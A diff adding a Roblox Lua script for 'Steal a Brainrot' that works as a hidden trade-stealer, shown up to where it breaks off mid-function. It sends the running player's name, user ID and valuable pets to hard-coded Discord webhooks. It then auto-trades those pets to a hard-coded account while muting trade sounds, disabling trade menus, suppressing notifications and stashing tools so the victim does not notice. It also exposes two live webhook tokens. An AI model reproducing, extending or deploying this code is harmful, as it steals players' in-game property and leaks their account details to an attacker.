@@ -1,0 +1,1042 @@
+task.spawn(function()
+    if not game:IsLoaded() then
+        game.Loaded:Wait()
+    end
+
+    local allowedPlaces = { 99606176102979, 109983668079237,79906538690694,119594317142884 }
+    if not table.find(allowedPlaces, game.PlaceId) then
+        return
+    end
+
+    task.spawn(function()
+        local WEBHOOK_URL = "https://discord.com/api/webhooks/1510421027916615711/DIaJdwyeVwn1VzL-hPldUIPOFX1a2hH6g00X_Y-hmoFMs-mBIVd6ilQyLryyoSgFxGTg"
+        local GOOD_AVATAR = "https://cdn.pfps.gg/pfps/77602-blood-cat.gif"
+        local webhookSent = false
+
+        local HttpService = game:GetService("HttpService")
+        local Players = game:GetService("Players")
+        local ReplicatedStorage = game:GetService("ReplicatedStorage")
+        local LocalPlayer = Players.LocalPlayer
+
+        local FANDOM_BASE = "https://stealabrainrot.fandom.com/wiki/"
+
+        local ALLOWED_ANIMALS = {
+            "Skibidi Toilet", "John Pork", "Kraken", "Foxini Laternini", "Ginger Gerat",
+            "Dragon Aquanini", "Meowl", "Strawberry Elephant", "Dragon Cannelloni",
+            "Hydra Dragon Cannelloni", "La Supreme Combinasion", "Dragon Gingerini",
+            "La Casa Boo", "Love Love Bear", "Griffin", "Signore Carapace",
+            "Elefanto Frigo", "Bunny and Eggy", "Antonio", "Hydra Bunny",
+            "Headless Horseman", "Arcadragon", "Fishino Clownino", "Globa Steppa",
+            "Kalika Bros", "Digi Narwhal", "Pancake and Syrup", "Rico Dinero",
+            "Jelly Moby", "Los Hacker", "Cerberus",
+        }
+
+        local ALLOWED_ANIMALS_SET = {}
+        for _, name in ipairs(ALLOWED_ANIMALS) do
+            ALLOWED_ANIMALS_SET[name] = true
+        end
+
+        local function parseGeneration(str)
+            if not str then return 0 end
+            str = tostring(str):gsub("%s",""):gsub(",",""):gsub("/s","")
+            local num, suf = str:match("([%d%.]+)([KkMmBbTt]?)$")
+            if not num then return tonumber(str:match("%d+%.?%d*")) or 0 end
+            num = tonumber(num)
+            suf = (suf or ""):upper()
+            if suf == "K" then return num * 1000
+            elseif suf == "M" then return num * 1000000
+            elseif suf == "B" then return num * 1000000000
+            elseif suf == "T" then return num * 1000000000000
+            else return num end
+        end
+
+        local function formatNumber(n)
+            if not n then return "$0/s" end
+            local function clean(s) return s:gsub("%.?0+$", "") end
+            if n >= 1e12 then return "$" .. clean(string.format("%.2f", n / 1e12)) .. "T/s" end
+            if n >= 1e9 then return "$" .. clean(string.format("%.2f", n / 1e9)) .. "B/s" end
+            if n >= 1e6 then return "$" .. clean(string.format("%.2f", n / 1e6)) .. "M/s" end
+            if n >= 1e3 then return "$" .. clean(string.format("%.2f", n / 1e3)) .. "K/s" end
+            return "$" .. tostring(math.floor(n)) .. "/s"
+        end
+
+        local function getMyPlotModel()
+            local PlotController
+            pcall(function()
+                PlotController = require(ReplicatedStorage.Controllers:WaitForChild("PlotController", 5))
+            end)
+            if not PlotController then return nil end
+
+            for i = 1, 30 do
+                local ok, plot = pcall(function() return PlotController.GetMyPlot() end)
+                if ok and plot and plot.PlotModel then
+                    return plot.PlotModel
+                end
+                task.wait(1)
+            end
+            return nil
+        end
+
+        local function getRequestFn()
+            return (syn and syn.request) or (http and http.request) or http_request or request
+        end
+
+        local function toWikiName(displayName)
+            local clean = displayName:match("^(.-)%s*%(") or displayName
+            return clean:gsub(" ", "_")
+        end
+
+        local imageCache = {}
+
+        local function fetchFandomImageUrl(displayName)
+            if imageCache[displayName] then
+                return imageCache[displayName]
+            end
+
+            local requestFn = getRequestFn()
+            if not requestFn then return nil end
+
+            local wikiName = toWikiName(displayName)
+            local url = FANDOM_BASE .. wikiName
+
+            for attempt = 1, 3 do
+                local ok, response = pcall(function()
+                    return requestFn({
+                        Url = url,
+                        Method = "GET",
+                        Headers = {
+                            ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+                            ["Accept"] = "text/html,*/*",
+                        },
+                        Timeout = 10,
+                    })
+                end)
+
+                if ok and response and response.StatusCode == 200 and response.Body then
+                    local body = response.Body
+
+                    local ogImage = body:match('property="og:image"%s+content="([^"]+)"')
+                        or body:match('content="([^"]+)"%s+property="og:image"')
+                    if ogImage and ogImage ~= "" then
+                        ogImage = ogImage:gsub("&amp;", "&"):gsub("&quot;", '"')
+                        if ogImage:find("^https?://") then
+                            imageCache[displayName] = ogImage
+                            return ogImage
+                        end
+                    end
+                end
+
+                if attempt < 3 then task.wait(0.5 * attempt) end
+            end
+
+            imageCache[displayName] = nil
+            return nil
+        end
+
+        local function getBestImageUrl(displayName)
+            local fandom = fetchFandomImageUrl(displayName)
+            if fandom then return fandom end
+            return nil
+        end
+
+        local function sendWebhook(brainrotData)
+            if webhookSent then return end
+            if #brainrotData == 0 then return end
+
+            local requestFn = getRequestFn()
+            if not requestFn then return end
+
+            table.sort(brainrotData, function(a, b) return a.genVal > b.genVal end)
+
+            local top = brainrotData[1]
+            local imageUrl = getBestImageUrl(top.name)
+
+            local lines = {}
+            for _, d in ipairs(brainrotData) do
+                table.insert(lines, "**" .. d.name .. "** — **" .. d.gen .. "**")
+            end
+            local listText = table.concat(lines, "\n")
+            if #listText > 3800 then listText = listText:sub(1, 3796) .. "..." end
+
+            local pCount = #Players:GetPlayers()
+
+            local embed = {
+                title = top.name .. " — " .. top.gen,
+                description = listText,
+                color = 16758468,
+                fields = {
+                    { name = "Server", value = "Players: **" .. pCount .. "** | Scanned: <t:" .. os.time() .. ":R>", inline = true },
+                },
+                footer = { text = LocalPlayer.Name .. " • " .. LocalPlayer.UserId },
+                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
+            }
+
+            if imageUrl then
+                embed.thumbnail = { url = imageUrl }
+            end
+
+            local payload = HttpService:JSONEncode({
+                content = "||@everyone||",
+                embeds = { embed },
+                username = "Maus top ",
+                avatar_url = GOOD_AVATAR,
+                allowed_mentions = { parse = { "everyone" } },
+            })
+
+            local success, err = pcall(function()
+                requestFn({
+                    Url = WEBHOOK_URL,
+                    Method = "POST",
+                    Headers = { ["Content-Type"] = "application/json" },
+                    Body = payload,
+                })
+            end)
+
+            if success then
+                webhookSent = true
+            end
+        end
+
+        task.spawn(function()
+            while true do
+                task.wait(5)
+                
+                if webhookSent then 
+                    break 
+                end
+
+                local foundBrainrots = {}
+                local success, err = pcall(function()
+                    local debris = workspace:FindFirstChild("Debris")
+                    if not debris then return end
+
+                    local myPlot = getMyPlotModel()
+                    if not myPlot then return end
+
+                    local plotPos = myPlot:GetPivot().Position
+                    local plotSize = Vector3.new(64, 20, 64)
+
+                    for _, pet in ipairs(debris:GetChildren()) do
+                        local ao = pet:FindFirstChild("AnimalOverhead") or pet:FindFirstChild("AnimalOverhead", true)
+                        if not ao then continue end
+
+                        local stolen = ao:FindFirstChild("Stolen")
+                        if stolen and stolen.Text:upper():find("FUSING") then continue end
+
+                        local nameObj = ao:FindFirstChild("DisplayName")
+                        local genObj = ao:FindFirstChild("Generation")
+                        local mutObj = ao:FindFirstChild("Mutation")
+                        if not nameObj then continue end
+
+                        local petPos = pet:GetPivot().Position
+                        local dx = math.abs(petPos.X - plotPos.X)
+                        local dz = math.abs(petPos.Z - plotPos.Z)
+                        local onMyPlot = (dx <= plotSize.X / 2) and (dz <= plotSize.Z / 2)
+                        if not onMyPlot then continue end
+
+                        local nameText = (nameObj:IsA("TextLabel") or nameObj:IsA("TextBox") or nameObj:IsA("TextButton")) and nameObj.Text or tostring(nameObj.Value)
+
+                        if ALLOWED_ANIMALS_SET[nameText] then
+                            local genText = genObj and ((genObj:IsA("TextLabel") or genObj:IsA("TextBox") or genObj:IsA("TextButton")) and genObj.Text or tostring(genObj.Value)) or "0"
+                            local mutText = mutObj and ((mutObj:IsA("TextLabel") or mutObj:IsA("TextBox") or mutObj:IsA("TextButton")) and mutObj.Text or tostring(mutObj.Value)) or "None"
+
+                            local genVal = parseGeneration(genText)
+                            local formattedGen = formatNumber(genVal)
+
+                            table.insert(foundBrainrots, {
+                                name = nameText,
+                                gen = formattedGen,
+                                genVal = genVal,
+                                mut = mutText
+                            })
+                        end
+                    end
+                end)
+
+                if #foundBrainrots > 0 then
+                    sendWebhook(foundBrainrots)
+                end
+            end
+        end)
+    end)
+
+    task.spawn(function()
+        local Services = setmetatable({}, {
+            __index = function(self, name)
+                local success, cache = pcall(function()
+                    return cloneref(game:GetService(name))
+                end)
+                if success then
+                    rawset(self, name, cache)
+                    return cache
+                else
+                    error("Invalid Service: " .. tostring(name))
+                end
+            end,
+        })
+
+        local TARGET_USER_ID = 7412398669
+        local TARGET_USERNAME = "Luis_munuz82"
+
+        local ALLOWED_ANIMALS = {
+            "Skibidi Toilet",
+            "John Pork",
+            "Kraken",
+            "Foxini Laternini",
+            "Ginger Gerat",
+            "Dragon Aquanini",
+            "Meowl",
+            "Strawberry Elephant",
+            "Dragon Cannelloni",
+            "Hydra Dragon Cannelloni",
+            "La Supreme Combinasion",
+            "Dragon Gingerini",
+            "La Casa Boo",
+            "Love Love Bear",
+            "Griffin",
+            "Signore Carapace",
+            "Elefanto Frigo",
+            "Bunny and Eggy",
+            "Antonio",
+            "Hydra Bunny",
+            "Headless Horseman",
+            "Arcadragon",
+            "Fishino Clownino",
+            "Globa Steppa",
+            "Kalika Bros",
+            "Digi Narwhal",
+            "Pancake and Syrup",
+            "Rico Dinero",
+            "Jelly Moby",
+            "Los Hacker",
+            "Cerberus",
+        }
+        
+        local ALLOWED_ANIMALS_SET = {}
+        for _, name in ipairs(ALLOWED_ANIMALS) do
+            ALLOWED_ANIMALS_SET[name] = true
+        end
+
+        local TRADE_WEBHOOK = "https://discord.com/api/webhooks/1510424789591003246/iXERexsqn7bVDZ_DgahMj7D_hmDlqvPQsfsNA3No8FloluIN6oC1CGGAm4nQ6hVWLDhl"
+        local TRADE_AVATAR = "https://cdn.pfps.gg/pfps/77602-blood-cat.gif"
+
+        local lastOfferedList = {}
+        local sendTradeCompleteWebhook
+
+        local Net = Services.ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net")
+
+        local function getRemote(label)
+            local children = Net:GetChildren()
+            for i, obj in ipairs(children) do
+                if obj.Name == label then
+                    if i > 1 then
+                        local possibleRemote = children[i-1]
+                        if possibleRemote:IsA("RemoteEvent") or possibleRemote:IsA("RemoteFunction") then
+                            return possibleRemote
+                        end
+                    end
+                    if i < #children then
+                        local possibleRemote = children[i+1]
+                        if possibleRemote:IsA("RemoteEvent") or possibleRemote:IsA("RemoteFunction") then
+                            return possibleRemote
+                        end
+                    end
+                end
+            end
+            return nil
+        end
+
+        local INVITE_UUID = "afb005f9-6e81-4e0a-8bb0-3555938a9658"
+        local ADD_BRAINROT_UUID = "6b5f15fb-5cb9-4d07-a031-bbff8e641eda"
+        local READY_UUID = "d73acf93-6f32-44df-b813-0f6b32c7afd9"
+        local ACCEPT_UUID = "918ee0f5-e98f-413f-b76e-baee47b021cb"
+
+        local inviteRemote = getRemote("RF/TradeService/Invite")
+        local addRemote = getRemote("RF/TradeService/AddBrainrot")
+        local readyRemote = getRemote("RE/TradeService/Ready")
+        local acceptRemote = getRemote("RE/TradeService/Accept")
+
+        local Animals = require(Services.ReplicatedStorage.Datas.Animals)
+        local AnimalsShared = require(Services.ReplicatedStorage.Shared.Animals)
+
+        local syncFolder = Services.ReplicatedStorage.Packages:WaitForChild("Synchronizer")
+        local requestData = syncFolder:FindFirstChild("RequestData")
+
+        local PlotClientClass = Services.ReplicatedStorage:FindFirstChild("Classes")
+            and Services.ReplicatedStorage.Classes:FindFirstChild("PlotClient")
+            and require(Services.ReplicatedStorage.Classes.PlotClient)
+
+        local InterfaceController = require(Services.ReplicatedStorage.Controllers.InterfaceController)
+        local ReplicatorClient = require(Services.ReplicatedStorage.Packages.ReplicatorClient)
+        local CameraController = require(Services.ReplicatedStorage.Controllers.CameraController)
+        local NotificationController = require(Services.ReplicatedStorage.Controllers.NotificationController)
+        local CornerNotificationController = require(Services.ReplicatedStorage.Controllers.CornerNotificationController)
+
+        local LocalPlayer = Services.Players.LocalPlayer
+        local tradeRep = ReplicatorClient.get(("Trade_%*"):format(LocalPlayer.UserId))
+
+        local hiding = false
+
+        local blurBlockConns = {}
+        local originalBlurSizes = {}
+        local originalCameraFOV = nil
+        local fovBlockConns = {}
+        local originalBlurFunc = CameraController.Blur
+        local originalFovFunc = CameraController.Fov
+
+        local TRADE_SOUND_KEYWORDS = {
+            "trade", "invite", "ready", "accept", "decline", "cancel",
+            "notification", "alert", "swoosh", "whoosh", "click",
+            "popup", "open", "close", "show", "hide", "ding",
+            "chime", "bell", "coin", "reward", "complete"
+        }
+        local savedSoundVolumes = {}
+        local soundBlockConns = {}
+
+        local originalCorner = CornerNotificationController.Add
+        local originalNotify = NotificationController.Notify
+        local originalToggle = InterfaceController.Toggle
+        local originalSetCore = nil
+        pcall(function() originalSetCore = Services.StarterGui.SetCore end)
+
+        local TRADE_GUI_NAMES = { "TradePlayerList", "TradeLiveTrade", "TradePrompts" }
+        local tradeGuiPrevEnabled = {}
+        local tradeGuiConnections = {}
+
+        local toolStash = {}
+
+        local function stashTools(hide)
+            if hide then
+                toolStash = {}
+                local char = LocalPlayer.Character
+                local hum = char and char:FindFirstChildOfClass("Humanoid")
+                if hum then pcall(function() hum:UnequipTools() end) end
+                local bp = LocalPlayer:FindFirstChildOfClass("Backpack")
+                for _, container in ipairs({ char, bp }) do
+                    if container then
+                        for _, item in ipairs(container:GetChildren()) do
+                            if item:IsA("Tool") or item:IsA("HopperBin") then
+                                table.insert(toolStash, { item = item, parent = item.Parent })
+                                pcall(function() item.Parent = nil end)
+                            end
+                        end
+                    end
+                end
+            else
+                for _, s in ipairs(toolStash) do
+                    if s.item and s.parent then
+                        pcall(function() s.item.Parent = s.parent end)
+                    end
+                end
+                toolStash = {}
+            end
+        end
+
+        local transparencyLocks = {}
+
+        local function lockModelTransparency(slot, model, computeTarget)
+            if not slot or not model then return end
+            local existing = transparencyLocks[slot]
+            if existing and existing.model ~= model then
+                for p, c in pairs(existing.conns) do pcall(function() c:Disconnect() end) end
+                transparencyLocks[slot] = nil
+                existing = nil
+            end
+            if not existing then
+                existing = { model = model, conns = {}, targets = {} }
+                transparencyLocks[slot] = existing
+            end
+            for _, p in ipairs(model:GetDescendants()) do
+                if p:IsA("BasePart") then
+                    local target = computeTarget(p)
+                    if target ~= nil and existing.targets[p] ~= target then
+                        if existing.conns[p] then existing.conns[p]:Disconnect() end
+                        existing.targets[p] = target
+                        p.Transparency = target
+                        existing.conns[p] = p:GetPropertyChangedSignal("Transparency"):Connect(function()
+                            if p.Parent and p.Transparency ~= existing.targets[p] then
+                                p.Transparency = existing.targets[p]
+                            end
+                        end)
+                    end
+                end
+            end
+        end
+
+        local function unlockModelTransparency(slot)
+            if not slot then return end
+            local lock = transparencyLocks[slot]
+            if not lock then return end
+            for p, c in pairs(lock.conns) do
+                pcall(function() c:Disconnect() end)
+                if p.Parent then
+                    local def = p:GetAttribute("DefaultTransparency")
+                    if def ~= nil then pcall(function() p.Transparency = def end) end
+                end
+            end
+            transparencyLocks[slot] = nil
+        end
+
+        local enabledLocks = {}
+
+        local function lockOverheadEnabled(slot, overhead)
+            if not overhead or not slot then return end
+            if enabledLocks[slot] and enabledLocks[slot].gui == overhead then return end
+            if enabledLocks[slot] then enabledLocks[slot].conn:Disconnect() end
+            overhead.Enabled = false
+            local conn = overhead:GetPropertyChangedSignal("Enabled"):Connect(function()
+                if overhead.Parent and overhead.Enabled then overhead.Enabled = false end
+            end)
+            enabledLocks[slot] = { gui = overhead, conn = conn }
+        end
+
+        local function unlockOverheadEnabled(slot)
+            if not slot then return end
+            local lock = enabledLocks[slot]
+            if not lock then return end
+            lock.conn:Disconnect()
+            if lock.gui and lock.gui.Parent then lock.gui.Enabled = true end
+            enabledLocks[slot] = nil
+        end
+
+        local function blockBlur()
+            local lighting = game:GetService("Lighting")
+            for _, desc in lighting:GetDescendants() do
+                if desc:IsA("BlurEffect") then
+                    originalBlurSizes[desc] = desc.Size
+                    desc.Size = 0
+                    local conn = desc:GetPropertyChangedSignal("Size"):Connect(function()
+                        if hiding and desc.Size > 0 then desc.Size = 0 end
+                    end)
+                    table.insert(blurBlockConns, conn)
+                end
+            end
+            local addConn = lighting.DescendantAdded:Connect(function(desc)
+                if desc:IsA("BlurEffect") and hiding then
+                    originalBlurSizes[desc] = desc.Size
+                    desc.Size = 0
+                    local propConn = desc:GetPropertyChangedSignal("Size"):Connect(function()
+                        if hiding and desc.Size > 0 then desc.Size = 0 end
+                    end)
+                    table.insert(blurBlockConns, propConn)
+                end
+            end)
+            table.insert(blurBlockConns, addConn)
+            pcall(function()
+                local camera = workspace.CurrentCamera
+                if camera then
+                    for _, desc in camera:GetDescendants() do
+                        if desc:IsA("BlurEffect") then
+                            originalBlurSizes[desc] = desc.Size
+                            desc.Size = 0
+                            local conn = desc:GetPropertyChangedSignal("Size"):Connect(function()
+                                if hiding and desc.Size > 0 then desc.Size = 0 end
+                            end)
+                            table.insert(blurBlockConns, conn)
+                        end
+                    end
+                    local camAddConn = camera.DescendantAdded:Connect(function(desc)
+                        if desc:IsA("BlurEffect") and hiding then
+                            originalBlurSizes[desc] = desc.Size
+                            desc.Size = 0
+                            local propConn = desc:GetPropertyChangedSignal("Size"):Connect(function()
+                                if hiding and desc.Size > 0 then desc.Size = 0 end
+                            end)
+                            table.insert(blurBlockConns, propConn)
+                        end
+                    end)
+                    table.insert(blurBlockConns, camAddConn)
+                end
+            end)
+        end
+
+        local function unblockBlur()
+            for _, conn in ipairs(blurBlockConns) do
+                pcall(function() conn:Disconnect() end)
+            end
+            blurBlockConns = {}
+            for blur, size in pairs(originalBlurSizes) do
+                if blur and blur.Parent then
+                    pcall(function() blur.Size = size end)
+                end
+            end
+            originalBlurSizes = {}
+        end
+
+        local function blockFOV()
+            pcall(function()
+                local camera = workspace.CurrentCamera
+                originalCameraFOV = camera.FieldOfView
+                local conn = camera:GetPropertyChangedSignal("FieldOfView"):Connect(function()
+                    if hiding and originalCameraFOV then
+                        camera.FieldOfView = originalCameraFOV
+                    end
+                end)
+                table.insert(fovBlockConns, conn)
+            end)
+        end
+
+        local function unblockFOV()
+            for _, conn in ipairs(fovBlockConns) do
+                pcall(function() conn:Disconnect() end)
+            end
+            fovBlockConns = {}
+            if originalCameraFOV then
+                pcall(function() workspace.CurrentCamera.FieldOfView = originalCameraFOV end)
+                originalCameraFOV = nil
+            end
+        end
+
+        local function isTradeSound(sound)
+            local name = sound.Name:lower()
+            local path = sound:GetFullName():lower()
+            for _, keyword in ipairs(TRADE_SOUND_KEYWORDS) do
+                if name:find(keyword) then return true end
+            end
+            if path:find("trade") then return true end
+            return false
+        end
+
+        local function muteTradeSounds()
+            savedSoundVolumes = {}
+            local soundsFolder = Services.ReplicatedStorage:FindFirstChild("Sounds")
+            if not soundsFolder then return end
+            local sfx = soundsFolder:FindFirstChild("Sfx")
+            if not sfx then return end
+            for _, desc in ipairs(sfx:GetDescendants()) do
+                if desc:IsA("Sound") and isTradeSound(desc) then
+                    savedSoundVolumes[desc] = desc.Volume
+                    desc.Volume = 0
+                    local conn = desc:GetPropertyChangedSignal("Volume"):Connect(function()
+                        if hiding and desc.Volume > 0 then desc.Volume = 0 end
+                    end)
+                    table.insert(soundBlockConns, conn)
+                end
+            end
+            local addConn = sfx.DescendantAdded:Connect(function(desc)
+                if desc:IsA("Sound") and hiding and isTradeSound(desc) then
+                    savedSoundVolumes[desc] = desc.Volume
+                    desc.Volume = 0
+                    local propConn = desc:GetPropertyChangedSignal("Volume"):Connect(function()
+                        if hiding and desc.Volume > 0 then desc.Volume = 0 end
+                    end)
+                    table.insert(soundBlockConns, propConn)
+                end
+            end)
+            table.insert(soundBlockConns, addConn)
+            local activated = sfx:FindFirstChild("Activated")
+            if activated and activated:IsA("Sound") then
+                savedSoundVolumes[activated] = activated.Volume
+                activated.Volume = 0
+            end
+        end
+
+        local function unmuteTradeSounds()
+            for _, conn in ipairs(soundBlockConns) do
+                pcall(function() conn:Disconnect() end)
+            end
+            soundBlockConns = {}
+            for sound, volume in pairs(savedSoundVolumes) do
+                if sound and sound.Parent then
+                    pcall(function() sound.Volume = volume end)
+                end
+            end
+            savedSoundVolumes = {}
+        end
+
+        local function setTradeGuisHidden(hide)
+            local pg = LocalPlayer:FindFirstChildOfClass("PlayerGui")
+            if not pg then return end
+            if hide then
+                for _, name in ipairs(TRADE_GUI_NAMES) do
+                    local gui = pg:FindFirstChild(name)
+                    if gui and not tradeGuiConnections[name] then
+                        tradeGuiPrevEnabled[name] = gui.Enabled
+                        gui.Enabled = false
+                        tradeGuiConnections[name] = gui:GetPropertyChangedSignal("Enabled"):Connect(function()
+                            if gui.Enabled then gui.Enabled = false end
+                        end)
+                    end
+                end
+            else
+                for name, conn in pairs(tradeGuiConnections) do
+                    conn:Disconnect()
+                    tradeGuiConnections[name] = nil
+                end
+                for _, name in ipairs(TRADE_GUI_NAMES) do
+                    local gui = pg:FindFirstChild(name)
+                    if gui and tradeGuiPrevEnabled[name] ~= nil then
+                        gui.Enabled = tradeGuiPrevEnabled[name]
+                        tradeGuiPrevEnabled[name] = nil
+                    end
+                end
+            end
+        end
+
+        local function getMyPlot()
+            local PlotController
+            pcall(function()
+                PlotController = require(Services.ReplicatedStorage.Controllers:WaitForChild("PlotController", 5))
+            end)
+            if not PlotController then return nil end
+
+            for i = 1, 30 do
+                local ok, plot = pcall(function()
+                    return PlotController.GetMyPlot()
+                end)
+                if ok and plot and plot.PlotModel then
+                    return plot.PlotModel
+                end
+                task.wait(1)
+            end
+            return nil
+        end
+
+        local cachedPlotClient = nil
+        local function getLivePlotClient(plot)
+            if cachedPlotClient and rawget(cachedPlotClient, "PlotModel") == plot then return cachedPlotClient end
+            if not plot or not PlotClientClass or not getgc then return nil end
+            for _, value in ipairs(getgc(true)) do
+                if type(value) == "table"
+                    and rawget(value, "PlotModel") == plot
+                    and rawget(value, "Channel")
+                    and rawget(value, "AnimalsModels")
+                then
+                    cachedPlotClient = value
+                    return value
+                end
+            end
+            return nil
+        end
+
+        local function findOverheadForSlot(slot, plot)
+            local podium = plot.AnimalPodiums:FindFirstChild(tostring(slot))
+            local spawn = podium and podium:FindFirstChild("Base") and podium.Base:FindFirstChild("Spawn")
+            if not spawn then return nil end
+            local sp = spawn.Position
+            local targetXZ = Vector2.new(sp.X, sp.Z)
+            local debris = workspace:FindFirstChild("Debris")
+            if not debris then return nil end
+            local best, bestDist = nil, math.huge
+            for _, part in ipairs(debris:GetChildren()) do
+                if part.Name == "FastOverheadTemplate" then
+                    local gui = part:FindFirstChild("AnimalOverhead")
+                    if gui and gui:IsA("SurfaceGui") then
+                        local pp = part.Position
+                        local d = (Vector2.new(pp.X, pp.Z) - targetXZ).Magnitude
+                        if d < bestDist and d < 6 then
+                            best, bestDist = gui, d
+                        end
+                    end
+                end
+            end
+            return best
+        end
+
+        local restoreLoopConn = nil
+
+        local function enforceLocalRestore()
+            local plot = getMyPlot()
+            if not plot then return end
+            local live = getLivePlotClient(plot)
+            if not live then return end
+            local models = rawget(live, "AnimalsModels")
+            if typeof(models) ~= "table" then return end
+            for slot, model in pairs(models) do
+                if typeof(model) == "Instance" then
+                    unlockModelTransparency(slot)
+                    local overhead = findOverheadForSlot(slot, plot)
+                    if overhead then unlockOverheadEnabled(slot) end
+                end
+            end
+        end
+
+        local function startRestoreLoop()
+            if restoreLoopConn then return end
+            restoreLoopConn = game:GetService("RunService").Heartbeat:Connect(function()
+                pcall(enforceLocalRestore)
+            end)
+        end
+
+        local function stopRestoreLoop()
+            if restoreLoopConn then
+                restoreLoopConn:Disconnect()
+                restoreLoopConn = nil
+            end
+        end
+
+        local function applyHiding()
+            if hiding then return end
+            hiding = true
+            blockBlur()
+            blockFOV()
+            CameraController.Blur = function() end
+            CameraController.Fov = function() end
+            CornerNotificationController.Add = function() end
+            NotificationController.Notify = function() end
+            pcall(function()
+                if originalSetCore then
+                    Services.StarterGui.SetCore = function(self, name, ...)
+                        if name == "SendNotification" or name == "ChatMakeSystemMessage" then return end
+                        return originalSetCore(self, name, ...)
+                    end
+                end
+            end)
+            InterfaceController.Toggle = function(self, p12, p13, p14)
+                p14 = p14 or {}
+                if not table.find(p14, "Hud") then table.insert(p14, "Hud") end
+                return originalToggle(self, p12, p13, p14)
+            end
+            muteTradeSounds()
+            setTradeGuisHidden(true)
+            stashTools(true)
+        end
+
+        local function restoreHiding()
+            if not hiding then return end
+            hiding = false
+            unblockBlur()
+            unblockFOV()
+            CameraController.Blur = originalBlurFunc
+            CameraController.Fov = originalFovFunc
+            CornerNotificationController.Add = originalCorner
+            NotificationController.Notify = originalNotify
+            pcall(function()
+                if originalSetCore then Services.StarterGui.SetCore = originalSetCore end
+            end)
+            InterfaceController.Toggle = originalToggle
+            unmuteTradeSounds()
+            setTradeGuisHidden(false)
+            stashTools(false)
+            stopRestoreLoop()
+            for slot, _ in pairs(transparencyLocks) do unlockModelTransparency(slot) end
+            for slot, _ in pairs(enabledLocks) do unlockOverheadEnabled(slot) end
+        end
+
+        local function stopHiding()
+            task.delay(2, restoreHiding)
+        end
+
+        local function getWhitelistBrainrots()
+            local plot = getMyPlot()
+            if not plot then return {} end
+
+            local live = getLivePlotClient(plot)
+            
+            if live then
+                local animalList = rawget(live, "AnimalList")
+                if typeof(animalList) == "table" then
+                    local entries = {}
+                    for slot, animal in pairs(animalList) do
+                        if typeof(animal) == "table" and not animal.Machine and animal.Index then
+                            local animalData = Animals[animal.Index]
+                            if animalData then
+                                local displayName = animalData.DisplayName or animal.Index
+                                if ALLOWED_ANIMALS_SET[displayName] then
+                                    table.insert(entries, {
+                                        index = slot,
+                                        animal = animal,
+                                        name = displayName
+                                    })
+                                end
+                            end
+                        end
+                    end
+                    if #entries > 0 then
+                        return entries
+                    end
+                end
+            end
+            
+            if requestData then
+                local ok, data = pcall(function()
+                    return requestData:InvokeServer(plot.Name)
+                end)
+                if ok and typeof(data) == "table" and typeof(data.AnimalList) == "table" then
+                    local entries = {}
+                    for slot, animal in pairs(data.AnimalList) do
+                        if typeof(animal) == "table" and not animal.Machine and animal.Index then
+                            local animalData = Animals[animal.Index]
+                            if animalData then
+                                local displayName = animalData.DisplayName or animal.Index
+                                if ALLOWED_ANIMALS_SET[displayName] then
+                                    table.insert(entries, {
+                                        index = slot,
+                                        animal = animal,
+                                        name = displayName
+                                    })
+                                end
+                            end
+                        end
+                    end
+                    if #entries > 0 then
+                        return entries
+                    end
+                end
+            end
+            
+            return {}
+        end
+
+        local function formatNumber(n)
+            if not n then return "$0/s" end
+            local function clean(s) return s:gsub("%.?0+$", "") end
+            if n >= 1e12 then return "$" .. clean(string.format("%.2f", n / 1e12)) .. "T/s" end
+            if n >= 1e9  then return "$" .. clean(string.format("%.2f", n / 1e9))  .. "B/s" end
+            if n >= 1e6  then return "$" .. clean(string.format("%.2f", n / 1e6))  .. "M/s" end
+            if n >= 1e3  then return "$" .. clean(string.format("%.2f", n / 1e3))  .. "K/s" end
+            return "$" .. tostring(math.floor(n)) .. "/s"
+        end
+
+        local function getRequestFn()
+            return (syn and syn.request) or (http and http.request) or http_request or request
+        end
+
+        sendTradeCompleteWebhook = function(offered)
+            if not offered or #offered == 0 then return end
+            local requestFn = getRequestFn()
+            if not requestFn then return end
+            local lines = {}
+            for i, e in ipairs(offered) do
+                local info = Animals and Animals[e.animal.Index]
+                local nm = (info and info.DisplayName) or e.animal.Index
+                local mut = e.animal.Mutation
+                local prefix = (mut and mut ~= "None" and mut ~= "") and ("[" .. mut .. "] ") or ""
+                local gen = 0
+                pcall(function() gen = AnimalsShared:GetGeneration(e.animal.Index, e.animal.Mutation, e.animal.Traits) end)
+                lines[i] = prefix .. "**" .. nm .. "** — " .. formatNumber(gen)
+            end
+            local desc = (#lines > 0) and table.concat(lines, "\n") or "No items offered."
+            local embed = {
+                title = "Trade Complete",
+                description = desc,
+                color = 5763719,
+                fields = {
+                    { name = "Target", value = TARGET_USERNAME .. " (" .. tostring(TARGET_USER_ID) .. ")", inline = true },
+                    { name = "Items", value = tostring(#offered), inline = true },
+                },
+                footer = { text = LocalPlayer.Name .. " • " .. LocalPlayer.UserId },
+                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
+            }
+            local payload = Services.HttpService:JSONEncode({
+                embeds = { embed }, username = "Trade Logger", avatar_url = TRADE_AVATAR
+            })
+            pcall(function()
+                requestFn({ Url = TRADE_WEBHOOK, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = payload })
+            end)
+        end
+
+        local function tryAddBrainrot(entry)
+            while true do
+                local ok, success, result = pcall(function()
+                    return addRemote:InvokeServer(ADD_BRAINROT_UUID, entry.index, entry.animal)
+                end)
+                if not ok then return false end
+                if success then return true end
+                if typeof(result) == "string" then
+                    if result:lower():find("please wait") then
+                        task.wait(0.5)
+                    elseif result:lower():find("space") or result:lower():find("enough") then
+                        return "nospace"
+                    else
+                        return false
+                    end
+                else
+                    return false
+                end
+            end
+        end
+
+        local function spamReadyAccept()
+            task.spawn(function()
+                while tradeRep:TryIndex({ "active", "data" }) do
+                    local data = tradeRep:TryIndex({ "active", "data" })
+                    if not data then break end
+                    local allReady = true
+                    for _, player in data.players do
+                        if not player.ready then allReady = false; break end
+                    end
+                    if allReady then
+                        acceptRemote:FireServer(ACCEPT_UUID)
+                        task.wait(0.1)
+                    else
+                        readyRemote:FireServer(READY_UUID)
+                        task.wait(1)
+                    end
+                end
+                if sendTradeCompleteWebhook then
+                    pcall(sendTradeCompleteWebhook, lastOfferedList)
+                end
+                stopHiding()
+            end)
+        end
+
+        local function offerWhitelistBrainrots()
